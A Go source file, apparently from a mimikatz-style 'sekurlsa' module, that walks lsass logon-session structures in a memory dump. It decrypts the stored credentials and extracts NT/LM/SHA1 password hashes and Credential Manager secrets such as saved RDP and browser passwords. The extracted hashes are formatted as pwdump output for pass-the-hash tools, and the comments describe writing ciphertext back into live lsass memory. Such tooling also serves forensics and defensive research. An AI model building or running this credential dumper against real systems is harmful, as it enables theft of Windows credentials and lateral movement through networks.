package sekurlsa

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
)

// MSVLayout captures the per-build offsets inside an
// _MSV1_0_LOGON_SESSION node and the encrypted PrimaryCredentials
// payload it points at. Each Windows build (or LCU within a build,
// rarely) needs its own layout — pypykatz keeps a parallel set of
// `LogonSessionDecryptor` classes.
//
// Offsets are byte distances from the start of the node. Field types:
//
//   LUID                — 8-byte uint64
//   UNICODE_STRING      — 16 bytes (Length u16 + MaxLength u16 + Padding u32 + Buffer u64)
//   pointer             — 8-byte uint64 (we use 0 to mean "field not present")
//
// Set NodeSize to the smallest size that covers every offset we read,
// not the actual struct size — Microsoft sometimes appends fields we
// don't care about.
type MSVLayout struct {
	NodeSize uint32

	// LUID — locally-unique session id. Used as the LogonSession key.
	LUIDOffset uint32

	// UNICODE_STRING fields. Buffer pointer is dereferenced to read
	// the actual UTF-16 bytes from a separate region.
	UserNameOffset    uint32
	LogonDomainOffset uint32
	LogonServerOffset uint32

	// LogonType (uint32) — winnt.h LOGON_TYPE enum value.
	LogonTypeOffset uint32

	// LogonTime is a Windows FILETIME (100-ns ticks since 1601-01-01).
	LogonTimeOffset uint32

	// SID — pointer to a variable-length SID struct. Walker reads
	// the pointer + walks the SID byte sequence.
	SIDOffset uint32

	// CredentialsOffset is the pointer to the encrypted
	// PrimaryCredentials list head. The walker decrypts each
	// PrimaryCredentials_data blob with the lsaKey.
	CredentialsOffset uint32

	// CredManListPtrOffset is the byte offset INSIDE the session
	// node where a pointer to the per-session Credential Manager
	// (CredMan / Vault) list head sits. CredMan stores RDP saved
	// sessions, IE/Edge form passwords, network-share credentials,
	// etc. — extracted with the same lsaKey crypto as MSV primary.
	//
	// Set CredManListPtrOffset = 0 to disable the CredMan walker.
	// KvcForensic ships session_credman_ptr_offset for Win 11 24H2+
	// only (= 0x168); older builds need operator-supplied values.
	CredManListPtrOffset uint32

	// CredManLayout is the per-entry layout for the CredMan list
	// nodes. Required when CredManListPtrOffset != 0.
	CredManLayout CredManLayout
}

// MSVCredential is the credential payload extracted from an
// MSV1_0 logon session. NT hash is the legacy MD4(unicode(password))
// — the dominant pivot for pass-the-hash workflows. SHA1 hash is the
// AES256-DPAPI-derived key Microsoft introduced in Win11. LM hash is
// typically empty since Vista.
//
// CipherVA + CipherLen describe where the encrypted blob this
// credential was decoded from lives in the source process's memory.
// On a minidump-backed Parse, both reflect the original (live) lsass
// virtual address — the Pass-the-Hash write-back path consumes them
// to NtWriteVirtualMemory new ciphertext at the same VA. CipherVA
// is zero when the source was not a minidump or the layout walk
// could not locate the cipher buffer.
type MSVCredential struct {
	UserName    string
	LogonDomain string
	NTHash      [16]byte
	LMHash      [16]byte
	SHA1Hash    [20]byte
	DPAPIKey    [16]byte
	Found       bool // false if every hash field came back zero
	CipherVA    uint64
	CipherLen   uint16
}

// AuthPackage satisfies the Credential interface.
func (MSVCredential) AuthPackage() string { return "MSV1_0" }

// String renders the credential in the pwdump-compatible format
// expected by pass-the-hash tools (`username:rid:LM:NT:::`). When LM
// or NT are zero the function emits the standard placeholder
// `aad3b435b51404eeaad3b435b51404ee` + `31d6cfe0d16ae931b73c59d7e0c089c0`
// (= MD4 of empty string) so downstream tools accept the output.
//
// The RID column is 0 — we don't extract the SID-from-LUID mapping
// in v1; callers needing the real RID parse the SID field separately.
func (c MSVCredential) String() string {
	dom := c.LogonDomain
	user := c.UserName
	if dom != "" {
		user = dom + `\` + user
	}
	lm := hex.EncodeToString(c.LMHash[:])
	if isAllZero(c.LMHash[:]) {
		lm = "aad3b435b51404eeaad3b435b51404ee"
	}
	nt := hex.EncodeToString(c.NTHash[:])
	if isAllZero(c.NTHash[:]) {
		nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
	}
	return fmt.Sprintf("%s:0:%s:%s:::", user, lm, nt)
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
// Zeros every hash buffer in place — does NOT zero the strings, since
// strings in Go are immutable + the original buffers may still be
// referenced elsewhere by the caller.
func (c *MSVCredential) wipe() {
	for i := range c.NTHash {
		c.NTHash[i] = 0
	}
	for i := range c.LMHash {
		c.LMHash[i] = 0
	}
	for i := range c.SHA1Hash {
		c.SHA1Hash[i] = 0
	}
	for i := range c.DPAPIKey {
		c.DPAPIKey[i] = 0
	}
	c.Found = false
}

func isAllZero(b []byte) bool {
	for _, x := range b {
		if x != 0 {
			return false
		}
	}
	return true
}

// extractMSV walks the LogonSessionList and decrypts every node's
// PrimaryCredentials. Returns one LogonSession per node that yielded
// at least a parseable username — fully-zero / decryption-failed
// nodes accumulate as warnings.
//
// The LogonSessionList global is exported by lsasrv.dll (which hosts
// the MSV provider). msv1_0.dll defines the per-session struct
// layout but the array head + Flink chain live in lsasrv. Hence the
// pattern scan runs over lsasrv's image; msv1_0 is unused here today
// but kept in the signature so future providers (NetLogon, …) can
// share the API shape.
//
// lsasrvModule is the resolved lsasrv.dll Module from the parser;
// lsaKey is the key chain from extractLSAKeys; t.MSVLayout supplies
// the per-build node offsets.
func extractMSV(r *reader, lsasrvModule Module, t *Template, lsaKey *lsaKey) ([]LogonSession, []string) {
	var (
		sessions []LogonSession
		warnings []string
	)

	listHead, err := derefRel32(
		mustReadModuleBody(r, lsasrvModule),
		lsasrvModule.BaseOfImage,
		t.LogonSessionListPattern,
		t.LogonSessionListWildcards,
		t.LogonSessionListOffset,
		r,
	)
	if err != nil {
		warnings = append(warnings, fmt.Sprintf("MSV1_0 list head: %v", err))
		return nil, warnings
	}

	count := t.LogonSessionListCount
	if count == 0 {
		count = 64 // sane default; callers should set for their build
	}

	// Each bucket is a doubly-linked list. Walk every bucket head, follow
	// Flink pointers until we loop back to the head, bounded at 1024
	// nodes per bucket to defeat malformed dumps.
	for bucket := 0; bucket < count; bucket++ {
		bucketHead := listHead + uint64(bucket)*16 // head buckets are 16 bytes apart (LIST_ENTRY pair)
		flink, err := readPointer(r, bucketHead)
		if err != nil || flink == 0 || flink == bucketHead {
			continue
		}
		walked := 0
		for cur := flink; cur != bucketHead && walked < 1024; walked++ {
			node, err := r.ReadVA(cur, int(t.MSVLayout.NodeSize))
			if err != nil {
				warnings = append(warnings, fmt.Sprintf("MSV1_0 node @0x%X: %v", cur, err))
				break
			}
			session, decryptWarns := decodeLogonSession(r, node, t, lsaKey)
			warnings = append(warnings, decryptWarns...)
			if session != nil {
				session.MSVNodeVA = cur
				sessions = append(sessions, *session)
			}
			next, err := readPointer(r, cur) // Flink lives at offset 0
			if err != nil || next == 0 {
				break
			}
			cur = next
		}
	}

	return sessions, warnings
}

// mustReadModuleBody reads the full module image into memory. Errors
// here have already surfaced once during extractLSAKeys — re-fetch is
// cheap and isolated for the MSV-only entry path.
func mustReadModuleBody(r *reader, m Module) []byte {
	body, _ := r.ReadVA(m.BaseOfImage, int(m.SizeOfImage))
	return body
}

// decodeLogonSession projects a node-bytes blob through the layout
// to a LogonSession. Returns (nil, warnings) when the username is
// empty or decryption produced all zeros. Multiple warnings can
// surface when the optional CredMan walk produces its own.
func decodeLogonSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (*LogonSession, []string) {
	if len(node) < int(t.MSVLayout.NodeSize) {
		return nil, []string{fmt.Sprintf("node too small: %d < %d", len(node), t.MSVLayout.NodeSize)}
	}

	luid := binary.LittleEndian.Uint64(node[t.MSVLayout.LUIDOffset : t.MSVLayout.LUIDOffset+8])
	username := readUnicodeString(r, node[t.MSVLayout.UserNameOffset:t.MSVLayout.UserNameOffset+16])
	domain := readUnicodeString(r, node[t.MSVLayout.LogonDomainOffset:t.MSVLayout.LogonDomainOffset+16])
	logonServer := readUnicodeString(r, node[t.MSVLayout.LogonServerOffset:t.MSVLayout.LogonServerOffset+16])

	// Skip empty / system sessions — they exist in the list but have
	// no credentials worth surfacing.
	if username == "" {
		return nil, nil
	}

	logonType := LogonTypeUnknown
	if t.MSVLayout.LogonTypeOffset > 0 {
		logonType = LogonType(binary.LittleEndian.Uint32(
			node[t.MSVLayout.LogonTypeOffset : t.MSVLayout.LogonTypeOffset+4]))
	}

	cred, decryptErr := decryptMSVPrimary(r, node, t, lsaKey)
	if decryptErr != "" {
		return nil, []string{decryptErr}
	}

	cred.UserName = username
	cred.LogonDomain = domain

	credentials := []Credential{&cred}
	var warnings []string

	// Optional CredMan walk — when MSVLayout.CredManListPtrOffset is
	// non-zero, the session node carries a per-session pointer to
	// the Credential Manager (Vault) list. Each entry produces a
	// CredManCredential alongside the MSVCredential in the same
	// session.
	if t.MSVLayout.CredManListPtrOffset != 0 &&
		t.MSVLayout.CredManListPtrOffset+8 <= t.MSVLayout.NodeSize {
		credManPtr := binary.LittleEndian.Uint64(
			node[t.MSVLayout.CredManListPtrOffset : t.MSVLayout.CredManListPtrOffset+8])
		if credManPtr != 0 {
			cmCreds, cmWarns := extractCredMan(r, credManPtr, t.MSVLayout.CredManLayout, lsaKey)
			warnings = append(warnings, cmWarns...)
			for i := range cmCreds {
				credentials = append(credentials, &cmCreds[i])
			}
		}
	}

	return &LogonSession{
		LUID:        luid,
		LogonType:   logonType,
		UserName:    username,
		LogonDomain: domain,
		LogonServer: logonServer,
		Credentials: credentials,
	}, warnings
}

// readUnicodeString dereferences a 16-byte UNICODE_STRING field
// (Length u16 + MaxLength u16 + 4-byte pad + Buffer u64). Returns
// "" on any read failure or zero buffer.
func readUnicodeString(r *reader, field []byte) string {
	if len(field) < 16 {
		return ""
	}
	length := binary.LittleEndian.Uint16(field[0:2])
	bufPtr := binary.LittleEndian.Uint64(field[8:16])
	if length == 0 || bufPtr == 0 {
		return ""
	}
	bytes_, err := r.ReadVA(bufPtr, int(length))
	if err != nil || len(bytes_) < int(length) || length%2 != 0 {
		return ""
	}
	u16 := make([]uint16, length/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(bytes_[i*2 : i*2+2])
	}
	return decodeUTF16(u16)
}

// decryptMSVPrimary follows the node's CredentialsOffset pointer to
// the encrypted PrimaryCredentials_data list head, decrypts the first
// entry's payload with the lsaKey, and parses the resulting
// MSV1_0_PRIMARY_CREDENTIAL struct for NT/LM/SHA1 hashes.
//
// Returns (zero MSVCredential, "warning") if decryption fails;
// caller surfaces the warning into Result.Warnings.
func decryptMSVPrimary(r *reader, node []byte, t *Template, lsaKey *lsaKey) (MSVCredential, string) {
	primaryPtrField := node[t.MSVLayout.CredentialsOffset : t.MSVLayout.CredentialsOffset+8]
	primaryPtr := binary.LittleEndian.Uint64(primaryPtrField)
	if primaryPtr == 0 {
		return MSVCredential{}, ""
	}

	// PrimaryCredentials list entry layout (offsets are stable across
	// every Win10/11 build we target):
	//   +0x00  Flink uint64
	//   +0x08  Blink uint64
	//   +0x10  Primary UNICODE_STRING (16 bytes)
	//   +0x20  Credentials UNICODE_STRING — Length is the encrypted
	//          blob size, Buffer points at the cipher bytes
	const primaryHeaderSize = 0x30
	primaryHeader, err := r.ReadVA(primaryPtr, primaryHeaderSize)
	if err != nil {
		return MSVCredential{}, fmt.Sprintf("primary header @0x%X: %v", primaryPtr, err)
	}
	credLen := binary.LittleEndian.Uint16(primaryHeader[0x20:0x22])
	credBufPtr := binary.LittleEndian.Uint64(primaryHeader[0x28:0x30])
	if credLen == 0 || credBufPtr == 0 {
		return MSVCredential{}, ""
	}
	ct, err := r.ReadVA(credBufPtr, int(credLen))
	if err != nil {
		return MSVCredential{}, fmt.Sprintf("primary cipher @0x%X: %v", credBufPtr, err)
	}
	pt, err := decryptLSA(ct, lsaKey)
	if err != nil {
		return MSVCredential{}, fmt.Sprintf("decrypt primary @0x%X: %v", credBufPtr, err)
	}

	c := parseMSVPrimary(pt)
	c.CipherVA = credBufPtr
	c.CipherLen = credLen
	return c, ""
}

// parseMSVPrimary projects a decrypted MSV1_0_PRIMARY_CREDENTIAL
// blob to typed hashes. Layout (Win10 1903+):
//
//   +0x00  LogonDomainName UNICODE_STRING
//   +0x10  UserName UNICODE_STRING
//   +0x20  NtOwfPassword OWF (16 bytes)
//   +0x30  LmOwfPassword OWF (16 bytes)
//   +0x40  ShaOwPassword OWF (20 bytes) — Win11+ only
//
// Pre-Win11 layouts may have a shorter struct; we cap reads at the
// declared blob length and zero-fill any tail field.
func parseMSVPrimary(pt []byte) MSVCredential {
	c := MSVCredential{}
	if len(pt) >= 0x40 {
		copy(c.NTHash[:], pt[0x20:0x30])
		copy(c.LMHash[:], pt[0x30:0x40])
	} else if len(pt) >= 0x30 {
		copy(c.NTHash[:], pt[0x20:0x30])
	}
	if len(pt) >= 0x54 {
		copy(c.SHA1Hash[:], pt[0x40:0x54])
	}
	c.Found = !isAllZero(c.NTHash[:]) || !isAllZero(c.LMHash[:]) || !isAllZero(c.SHA1Hash[:])
	return c
}
